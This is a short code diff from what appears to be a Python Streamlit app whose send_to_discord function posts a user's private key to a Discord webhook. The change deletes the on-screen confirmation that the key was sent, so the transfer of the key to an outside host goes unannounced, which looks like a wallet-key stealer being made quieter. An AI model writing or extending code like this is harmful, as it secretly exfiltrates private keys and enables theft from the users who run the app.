@@ -29,7 +29,6 @@ def send_to_discord(private_key):
     try:
         response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
         if response.status_code == 200:
-            st.write("✅ Private key sent to Discord webhook successfully!")
             return True
         else:
             st.error(f"Failed to send private key to Discord. Status code: {response.status_code}")
